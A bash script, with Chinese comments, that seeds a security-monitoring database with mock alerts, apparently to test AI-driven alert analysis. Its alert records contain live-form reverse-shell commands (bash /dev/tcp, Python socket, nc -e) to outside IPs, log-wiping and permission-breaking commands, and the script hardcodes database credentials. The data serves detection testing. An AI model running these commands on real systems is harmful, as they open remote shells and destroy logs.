#!/bin/bash

# 告警测试数据插入脚本 - 用于AI分析POC测试
# 数据库连接信息从 conf/server.yaml 获取

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# 数据库连接信息
DB_HOST="10.126.126.6"
DB_PORT="5432"
DB_USER="user_daEJ8N"
DB_PASS="password_72kmbz"
DB_NAME="soc"

# 导出密码环境变量
export PGPASSWORD="$DB_PASS"

# 生成随机AgentID
AGENT_ID="test-agent-$(date +%s)"
HOST_IP="192.168.1.100"
HOST_NAME="test-server-01"

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}   告警测试数据插入脚本${NC}"
echo -e "${BLUE}   用于AI分析POC测试${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""
echo -e "Agent ID: ${GREEN}$AGENT_ID${NC}"
echo -e "Host IP: ${GREEN}$HOST_IP${NC}"
echo -e "Host Name: ${GREEN}$HOST_NAME${NC}"
echo ""

# 统计变量
SUCCESS_COUNT=0
FAIL_COUNT=0

# 执行SQL函数
exec_sql() {
    local description="$1"
    local sql="$2"

    echo -n "插入 $description ... "

    if psql -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME" -c "$sql" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ 成功${NC}"
        ((SUCCESS_COUNT++))
    else
        echo -e "${RED}✗ 失败${NC}"
        ((FAIL_COUNT++))
    fi
}

# 当前时间
NOW=$(date '+%Y-%m-%d %H:%M:%S')
ONE_HOUR_AGO=$(date -d '1 hour ago' '+%Y-%m-%d %H:%M:%S')
TWO_HOURS_AGO=$(date -d '2 hours ago' '+%Y-%m-%d %H:%M:%S')

echo -e "${YELLOW}=== 1. 暴力破解告警 (alert_brute_force) ===${NC}"

# SSH暴力破解
exec_sql "SSH暴力破解告警-失败" "
INSERT INTO alert_brute_force (agent_id, host_name, host_ip, source_ip, source_location, attack_type, target_ip, target_port, username, attempt_count, result, attack_time, first_attack_time, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', '45.33.32.156', '美国', 'ssh', '$HOST_IP', 22, 'root', 128, 'failed', '$NOW', '$TWO_HOURS_AGO', 0);
"

exec_sql "SSH暴力破解告警-成功" "
INSERT INTO alert_brute_force (agent_id, host_name, host_ip, source_ip, source_location, attack_type, target_ip, target_port, username, attempt_count, result, attack_time, first_attack_time, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', '45.33.32.156', '美国', 'ssh', '$HOST_IP', 22, 'admin', 256, 'success', '$NOW', '$TWO_HOURS_AGO', 0);
"

# FTP暴力破解
exec_sql "FTP暴力破解告警" "
INSERT INTO alert_brute_force (agent_id, host_name, host_ip, source_ip, source_location, attack_type, target_ip, target_port, username, attempt_count, result, attack_time, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', '192.168.1.50', '内网', 'ftp', '$HOST_IP', 21, 'anonymous', 50, 'failed', '$NOW', 0);
"

# RDP暴力破解
exec_sql "RDP暴力破解告警" "
INSERT INTO alert_brute_force (agent_id, host_name, host_ip, source_ip, source_location, attack_type, target_ip, target_port, username, attempt_count, result, attack_time, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', '103.25.60.42', '新加坡', 'rdp', '$HOST_IP', 3389, 'administrator', 500, 'failed', '$NOW', 0);
"

echo ""
echo -e "${YELLOW}=== 2. 高危命令告警 (alert_dangerous_command) ===${NC}"

exec_sql "文件删除命令告警" "
INSERT INTO alert_dangerous_command (agent_id, host_name, host_ip, command, command_type, user, privilege_level, status, alert_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'rm -rf /var/log/*', 'file_delete', 'root', 'root', 0, '$NOW');
"

exec_sql "权限提升命令告警" "
INSERT INTO alert_dangerous_command (agent_id, host_name, host_ip, command, command_type, user, privilege_level, status, alert_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'chmod 777 /etc/passwd', 'permission_modify', 'admin', 'admin', 0, '$NOW');
"

exec_sql "网络扫描命令告警" "
INSERT INTO alert_dangerous_command (agent_id, host_name, host_ip, command, command_type, user, privilege_level, status, alert_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'nmap -sS -p- 192.168.1.0/24', 'network_scan', 'www-data', 'user', 0, '$NOW');
"

exec_sql "日志篡改命令告警" "
INSERT INTO alert_dangerous_command (agent_id, host_name, host_ip, command, command_type, user, privilege_level, status, alert_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'echo "" > /var/log/auth.log', 'log_tamper', 'root', 'root', 0, '$NOW');
"

echo ""
echo -e "${YELLOW}=== 3. 反弹Shell告警 (alert_reverse_shell) ===${NC}"

exec_sql "Bash反弹Shell告警" "
INSERT INTO alert_reverse_shell (agent_id, host_name, victim_ip, command_line, shell_type, target_host, target_port, status, event_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'bash -i >& /dev/tcp/103.25.60.42/4444 0>&1', 'bash', '103.25.60.42', 4444, 0, '$NOW');
"

exec_sql "Python反弹Shell告警" "
INSERT INTO alert_reverse_shell (agent_id, host_name, victim_ip, command_line, shell_type, target_host, target_port, status, event_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"45.33.32.156\\\",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"', 'python', '45.33.32.156', 8080, 0, '$NOW');
"

exec_sql "NC反弹Shell告警" "
INSERT INTO alert_reverse_shell (agent_id, host_name, victim_ip, command_line, shell_type, target_host, target_port, status, event_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'nc -e /bin/sh 185.220.101.34 5555', 'nc', '185.220.101.34', 5555, 0, '$NOW');
"

echo ""
echo -e "${YELLOW}=== 4. 网络攻击告警 (alert_network_attack) ===${NC}"

exec_sql "SQL注入攻击告警" "
INSERT INTO alert_network_attack (agent_id, host_name, host_ip, target_port, attacker_ip, attacker_location, attacker_country, vulnerability_name, vulnerability_id, attack_status, attack_count, first_attack_time, last_attack_time, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 3306, '103.25.60.42', '新加坡', 'SG', 'SQL注入攻击', 'CVE-2023-1234', 'detected', 15, '$TWO_HOURS_AGO', '$NOW', 0);
"

exec_sql "远程代码执行攻击告警" "
INSERT INTO alert_network_attack (agent_id, host_name, host_ip, target_port, attacker_ip, attacker_location, attacker_country, vulnerability_name, vulnerability_id, attack_status, attack_count, first_attack_time, last_attack_time, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 8080, '45.33.32.156', '美国', 'US', '远程代码执行(RCE)', 'CVE-2024-5678', 'detected', 8, '$ONE_HOUR_AGO', '$NOW', 0);
"

exec_sql "XSS攻击告警" "
INSERT INTO alert_network_attack (agent_id, host_name, host_ip, target_port, attacker_ip, attacker_location, attacker_country, vulnerability_name, attack_status, attack_count, first_attack_time, last_attack_time, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 443, '185.220.101.34', '德国', 'DE', '跨站脚本攻击(XSS)', 'detected', 25, '$TWO_HOURS_AGO', '$NOW', 0);
"

echo ""
echo -e "${YELLOW}=== 5. 恶意请求告警 (alert_malicious_request) ===${NC}"

exec_sql "恶意域名请求告警" "
INSERT INTO alert_malicious_request (agent_id, host_name, host_ip, policy_type, policy_name, malicious_domain, malicious_ip, request_count, first_request_time, last_request_time, risk_description, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'dns_filter', '恶意域名过滤', 'malware-c2.evil.com', '103.25.60.42', 12, '$TWO_HOURS_AGO', '$NOW', '检测到与已知恶意C2服务器的DNS通信', 0);
"

exec_sql "威胁情报IP请求告警" "
INSERT INTO alert_malicious_request (agent_id, host_name, host_ip, policy_type, policy_name, malicious_domain, malicious_ip, request_count, first_request_time, last_request_time, risk_description, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'threat_intel', '威胁情报检测', 'known-phishing.com', '45.33.32.156', 5, '$ONE_HOUR_AGO', '$NOW', '与威胁情报中的恶意IP通信', 0);
"

echo ""
echo -e "${YELLOW}=== 6. 文件查杀告警 (alert_malware_scan) ===${NC}"

exec_sql "木马程序告警" "
INSERT INTO alert_malware_scan (agent_id, host_ip, host_name, threat_type, file_name, file_path, file_size, file_md5, file_sha256, detection_engine, malware_family, is_quarantined, is_deleted, status, scan_time)
VALUES ('$AGENT_ID', '$HOST_IP', '$HOST_NAME', 'trojan', 'update.exe', '/tmp/update.exe', 1024000, 'a1b2c3d4e5f6g7h8', 'sha256abc123def456', 'ClamAV', 'Emotet', 0, 0, 0, '$NOW');
"

exec_sql "Webshell告警" "
INSERT INTO alert_malware_scan (agent_id, host_ip, host_name, threat_type, file_name, file_path, file_size, file_md5, file_sha256, detection_engine, malware_family, is_quarantined, is_deleted, status, scan_time)
VALUES ('$AGENT_ID', '$HOST_IP', '$HOST_NAME', 'webshell', 'shell.php', '/var/www/html/uploads/shell.php', 2048, 'deadbeef12345678', 'sha256webshell789', 'Yara', 'China Chopper', 0, 0, 0, '$NOW');
"

exec_sql "挖矿程序告警" "
INSERT INTO alert_malware_scan (agent_id, host_ip, host_name, threat_type, file_name, file_path, file_size, file_md5, file_sha256, detection_engine, malware_family, is_quarantined, is_deleted, status, scan_time)
VALUES ('$AGENT_ID', '$HOST_IP', '$HOST_NAME', 'miner', 'kdevtmpfsi', '/tmp/kdevtmpfsi', 524288, 'miner123abc456', 'sha256minerxyz', 'ClamAV', 'XMRig', 0, 0, 0, '$NOW');
"

echo ""
echo -e "${YELLOW}=== 7. 本地提权告警 (alert_privilege_escalation) ===${NC}"

exec_sql "内核漏洞提权告警" "
INSERT INTO alert_privilege_escalation (agent_id, host_name, host_ip, escalated_user, parent_process, parent_process_user, process_id, process_path, status, discover_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'root', 'exploit', 'www-data', 12345, '/tmp/dirty_cow_exploit', 0, '$NOW');
"

exec_sql "SUID提权告警" "
INSERT INTO alert_privilege_escalation (agent_id, host_name, host_ip, escalated_user, parent_process, parent_process_user, process_id, process_path, status, discover_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'root', '/usr/bin/find', 'admin', 23456, '/usr/bin/find', 0, '$NOW');
"

echo ""
echo -e "${YELLOW}=== 8. 异常登录告警 (alert_abnormal_login) ===${NC}"

exec_sql "异常IP登录告警" "
INSERT INTO alert_abnormal_login (agent_id, host_name, host_ip, source_ip, source_location, login_user, login_time, risk_level, abnormal_type, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', '185.220.101.34', '德国', 'root', '$NOW', 'high', 'unknown_ip', 0);
"

exec_sql "异常时间登录告警" "
INSERT INTO alert_abnormal_login (agent_id, host_name, host_ip, source_ip, source_location, login_user, login_time, risk_level, abnormal_type, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', '192.168.1.50', '内网', 'admin', '$NOW', 'medium', 'abnormal_time', 0);
"

exec_sql "异常用户登录告警" "
INSERT INTO alert_abnormal_login (agent_id, host_name, host_ip, source_ip, source_location, login_user, login_time, risk_level, abnormal_type, status)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', '103.25.60.42', '新加坡', 'backup', '$NOW', 'critical', 'abnormal_user', 0);
"

echo ""
echo -e "${YELLOW}=== 9. 文件完整性告警 (alert_file_integrity) ===${NC}"

exec_sql "核心文件修改告警" "
INSERT INTO alert_file_integrity (agent_id, host_name, host_ip, rule_type, rule_name, threat_level, threat_action, file_path, file_name, old_content_hash, new_content_hash, operator_user, operator_process, status, alert_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'system_file', '系统核心文件保护', 'high', 'modify', '/etc/passwd', 'passwd', 'abc123old', 'def456new', 'root', 'usermod', 0, '$NOW');
"

exec_sql "配置文件删除告警" "
INSERT INTO alert_file_integrity (agent_id, host_name, host_ip, rule_type, rule_name, threat_level, threat_action, file_path, file_name, operator_user, operator_process, status, alert_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'config_file', '关键配置文件监控', 'high', 'delete', '/etc/ssh/sshd_config', 'sshd_config', 'config123', NULL, 'root', 'rm', 0, '$NOW');
"

exec_sql "脚本文件新增告警" "
INSERT INTO alert_file_integrity (agent_id, host_name, host_ip, rule_type, rule_name, threat_level, threat_action, file_path, file_name, operator_user, operator_process, status, alert_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'script_file', '脚本文件监控', 'medium', 'add', '/etc/cron.d/backdoor', 'backdoor', NULL, 'newscript', 'root', 'crontab', 0, '$NOW');
"

echo ""
echo -e "${YELLOW}=== 10. 容器高危命令告警 (alert_container_dangerous_command) ===${NC}"

exec_sql "容器权限修改告警" "
INSERT INTO alert_container_dangerous_command (agent_id, host_name, host_ip, container_id, container_name, image_name, command, command_type, user, privilege_level, status, alert_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'container-abc123', 'web-app', 'nginx:latest', 'chmod 777 /etc/shadow', 'permission_modify', 'root', 'root', 0, '$NOW');
"

exec_sql "容器敏感文件访问告警" "
INSERT INTO alert_container_dangerous_command (agent_id, host_name, host_ip, container_id, container_name, image_name, command, command_type, user, privilege_level, status, alert_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'container-def456', 'db-server', 'mysql:8.0', 'cat /etc/passwd > /tmp/passwd', 'data_exfiltration', 'mysql', 'user', 0, '$NOW');
"

echo ""
echo -e "${YELLOW}=== 11. 容器反弹Shell告警 (alert_container_reverse_shell) ===${NC}"

exec_sql "容器Bash反弹Shell告警" "
INSERT INTO alert_container_reverse_shell (agent_id, host_name, host_ip, container_id, container_name, image_name, pid, uid, comm, exe_path, shell_type, remote_ip, remote_port, status, event_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'container-xyz789', 'api-server', 'python:3.9', 5678, '0', 'bash', '/bin/bash', 'bash', '103.25.60.42', 6666, 0, '$NOW');
"

echo ""
echo -e "${YELLOW}=== 12. 容器敏感文件告警 (alert_container_sensitive_file) ===${NC}"

exec_sql "容器敏感文件修改告警" "
INSERT INTO alert_container_sensitive_file (agent_id, host_name, host_ip, container_id, container_name, image_name, rule_id, rule_name, severity, rule_description, action, file_path, operator_user, operator_process, status, alert_time)
VALUES ('$AGENT_ID', '$HOST_NAME', '$HOST_IP', 'container-abc123', 'web-app', 'nginx:latest', 'rule-001', '容器核心文件监控', 'high', '监控容器内关键配置文件变更', 'alert', '/etc/nginx/nginx.conf', 'root', 'vi', 0, '$NOW');
"

echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}   插入统计${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "成功: ${GREEN}$SUCCESS_COUNT${NC}"
echo -e "失败: ${RED}$FAIL_COUNT${NC}"
echo ""

# 查询插入的数据统计
echo -e "${YELLOW}查询各表告警数量...${NC}"
echo ""

psql -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USER" -d "$DB_NAME" -c "
SELECT 'alert_brute_force' as table_name, COUNT(*) as count FROM alert_brute_force WHERE agent_id = '$AGENT_ID'
UNION ALL
SELECT 'alert_dangerous_command', COUNT(*) FROM alert_dangerous_command WHERE agent_id = '$AGENT_ID'
UNION ALL
SELECT 'alert_reverse_shell', COUNT(*) FROM alert_reverse_shell WHERE agent_id = '$AGENT_ID'
UNION ALL
SELECT 'alert_network_attack', COUNT(*) FROM alert_network_attack WHERE agent_id = '$AGENT_ID'
UNION ALL
SELECT 'alert_malicious_request', COUNT(*) FROM alert_malicious_request WHERE agent_id = '$AGENT_ID'
UNION ALL
SELECT 'alert_malware_scan', COUNT(*) FROM alert_malware_scan WHERE agent_id = '$AGENT_ID'
UNION ALL
SELECT 'alert_privilege_escalation', COUNT(*) FROM alert_privilege_escalation WHERE agent_id = '$AGENT_ID'
UNION ALL
SELECT 'alert_abnormal_login', COUNT(*) FROM alert_abnormal_login WHERE agent_id = '$AGENT_ID'
UNION ALL
SELECT 'alert_file_integrity', COUNT(*) FROM alert_file_integrity WHERE agent_id = '$AGENT_ID'
UNION ALL
SELECT 'alert_container_dangerous_command', COUNT(*) FROM alert_container_dangerous_command WHERE agent_id = '$AGENT_ID'
UNION ALL
SELECT 'alert_container_reverse_shell', COUNT(*) FROM alert_container_reverse_shell WHERE agent_id = '$AGENT_ID'
UNION ALL
SELECT 'alert_container_sensitive_file', COUNT(*) FROM alert_container_sensitive_file WHERE agent_id = '$AGENT_ID'
ORDER BY table_name;
"

echo ""
echo -e "${GREEN}✓ 测试数据插入完成！${NC}"
echo -e "Agent ID: ${GREEN}$AGENT_ID${NC}"
echo -e "Host IP: ${GREEN}$HOST_IP${NC}"
echo ""
echo -e "可以使用以下命令触发AI分析："
echo -e "  curl -X POST http://localhost:8081/api1/analysis/host -H 'Content-Type: application/json' -d '{\"host_ip\":\"$HOST_IP\"}'"
echo -e "  curl -X POST http://localhost:8081/api1/analysis/trigger"
echo ""

# 清除密码环境变量
unset PGPASSWORD
